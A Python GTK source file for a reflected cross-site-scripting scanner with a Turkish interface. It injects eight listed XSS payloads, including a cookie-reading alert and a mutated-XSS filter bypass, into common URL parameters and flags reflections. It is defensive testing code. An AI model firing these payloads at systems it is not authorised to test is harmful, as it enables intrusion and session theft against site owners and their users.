import gi
gi.require_version("Gtk", "3.0")
from gi.repository import Gtk, GLib
import threading
import requests
from urllib.parse import quote, urlparse

PAYLOADS = [
    ("<script>alert(1)</script>", "script tag"),
    ("<img src=x onerror=alert(1)>", "img onerror"),
    ("\"><svg onload=alert(1)>", "svg onload"),
    ("javascript:alert(1)", "javascript URI"),
    ("'-alert(1)-'", "event handler"),
    ("<iframe src=javascript:alert(1)>", "iframe"),
    ("\"><script>alert(document.cookie)</script>", "cookie steal"),
    ("<math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>\">", "mXSS bypass"),
]

TEST_PARAMS = ["q", "search", "query", "url", "id", "param", "name"]

IMPACT = {
    "script tag": "dogrudan JavaScript calistirir (en kritik)",
    "img onerror": "goruntu yuklenirken kod calistirir",
    "svg onload": "SVG yuklenirken kod calistirir",
    "javascript URI": "baglanti tiklandiginda kod calistirir",
    "event handler": "olay tetiklendiginde (tiklama, tus vs.) kod calistirir",
    "iframe": "zararli sayfa icerisine baska sayfa yerlesitirir",
    "cookie steal": "document.cookie ile oturum bilgilerini calar",
    "mXSS bypass": "mutated XSS ile filtreleri asar",
}


class XssScannerTab(Gtk.Box):
    def __init__(self):
        super().__init__(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        self.set_border_width(24)

        title = Gtk.Label(label="XSS Tarayici")
        title.get_style_context().add_class("title-label")
        title.set_xalign(0)
        self.pack_start(title, False, False, 0)

        desc = Gtk.Label(label="Hedef URL'nin yansimali (reflected) XSS aciklarini tespit eder. Sekiz farkli payload ve yaygin parametre isimleri test edilir. Yalnizca yetkili oldugunuz sistemlerde kullanin.")
        desc.get_style_context().add_class("desc-label")
        desc.set_line_wrap(True)
        desc.set_xalign(0)
        self.pack_start(desc, False, False, 0)

        sep = Gtk.Separator()
        self.pack_start(sep, False, False, 4)

        frame = Gtk.Frame(label="Hedef URL")
        input_box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=8)
        input_box.set_border_width(16)

        hbox = Gtk.Box(spacing=8)
        hbox.set_halign(Gtk.Align.CENTER)
        self.entry = Gtk.Entry(placeholder_text="https://ornek.com/sayfa.php")
        self.entry.set_size_request(340, 30)
        self.entry.connect("activate", lambda _: self.start_scan())
        hbox.pack_start(self.entry, False, False, 0)
        self.scan_btn = Gtk.Button(label="Taramayi Baslat")
        self.scan_btn.connect("clicked", lambda _: self.start_scan())
        self.scan_btn.get_style_context().add_class("suggested-action")
        hbox.pack_start(self.scan_btn, False, False, 0)
        input_box.pack_start(hbox, False, False, 0)

        frame.add(input_box)
        self.pack_start(frame, False, False, 0)

        self.textview = Gtk.TextView()
        self.textview.set_editable(False)
        self.textview.set_monospace(True)
        self.textview.get_style_context().add_class("output-text")
        self.textbuffer = self.textview.get_buffer()
        sw = Gtk.ScrolledWindow()
        sw.set_policy(Gtk.PolicyType.AUTOMATIC, Gtk.PolicyType.AUTOMATIC)
        sw.set_vexpand(True)
        sw.add(self.textview)
        self.pack_start(sw, True, True, 0)

        self.status_label = Gtk.Label(label="")
        self.pack_start(self.status_label, False, False, 0)

        self.running = False

    def log(self, text):
        end = self.textbuffer.get_end_iter()
        self.textbuffer.insert(end, text + "\n")

    def start_scan(self):
        url = self.entry.get_text().strip()
        if not url:
            self.status_label.set_text("URL girin")
            return
        if not url.startswith(("http://", "https://")):
            self.status_label.set_text("URL http/https ile baslamali")
            return
        if self.running:
            return
        self.running = True
        self.scan_btn.set_sensitive(False)
        self.textbuffer.set_text("")
        self.status_label.set_text("Taranıyor...")
        thread = threading.Thread(target=self.scan, args=(url,), daemon=True)
        thread.start()

    def scan(self, base_url):
        found = 0
        found_types = []
        for param in TEST_PARAMS:
            GLib.idle_add(self.log, f"[*] Parametre testi: ?{param}=")
            for payload, pname in PAYLOADS:
                sep = "&" if "?" in base_url else "?"
                test_url = f"{base_url}{sep}{param}={quote(payload)}"
                try:
                    r = requests.get(test_url, timeout=8, verify=False, allow_redirects=True)
                    body = r.text
                    if payload in body:
                        found += 1
                        found_types.append(pname)
                        GLib.idle_add(self.log, f"    [!] YANSIYAN ({pname}) -> {test_url[:80]}")
                        GLib.idle_add(self.log, f"        HTTP {r.status_code}, uzunluk {len(body)}")
                    elif "<" in body and "&lt;" in body and pname in ("script tag", "img onerror", "svg onload"):
                        GLib.idle_add(self.log, f"    [-] {pname} HTML-encode edilmis (guvenli gorunuyor)")
                except requests.exceptions.SSLError:
                    GLib.idle_add(self.log, f"    [-] SSL hatasi: {test_url[:80]}")
                except Exception as e:
                    GLib.idle_add(self.log, f"    [-] Hata: {e}")
        if found == 0:
            GLib.idle_add(self.log, "[-] Test edilen payloadlarin hicbiri yansimadi.")
        else:
            GLib.idle_add(self.log, "")
            GLib.idle_add(self.log, f"[!] {found} YANSIMA BULUNDU - XSS ZAFIYETI OLASILIGI YUKSEK")
            GLib.idle_add(self.log, "    Bu acik, bir saldirganin kurbanin tarayicisinda zararli kod")
            GLib.idle_add(self.log, "    calistirmasina izin verir. Peki ne yapabilir?")
            for t in set(found_types):
                GLib.idle_add(self.log, f"      - {IMPACT.get(t, t)}")
            GLib.idle_add(self.log, "")
            GLib.idle_add(self.log, "    Yani site 'guvenli' gorunse bile saldirgan sunlari yapabilir:")
            GLib.idle_add(self.log, "      - Oturum/cerez hirsizligi ile hesabinizi ele gecirir")
            GLib.idle_add(self.log, "      - Sifre yazan saghte giris formu (kimlik avi) gosterir")
            GLib.idle_add(self.log, "      - Site sayfasinin icerigini degistirir (defacing)")
            GLib.idle_add(self.log, "      - Yonetici ise tum siteyi tamamen ele gecirir")
            GLib.idle_add(self.log, "    Korunma: Tum girdileri cikista HTML-encode edin, CSP kullanin")
        GLib.idle_add(self.finish_scan, found)

    def finish_scan(self, found):
        self.running = False
        self.scan_btn.set_sensitive(True)
        self.status_label.set_text(f"Tarama tamamlandi - {found} muhtemel yansima")
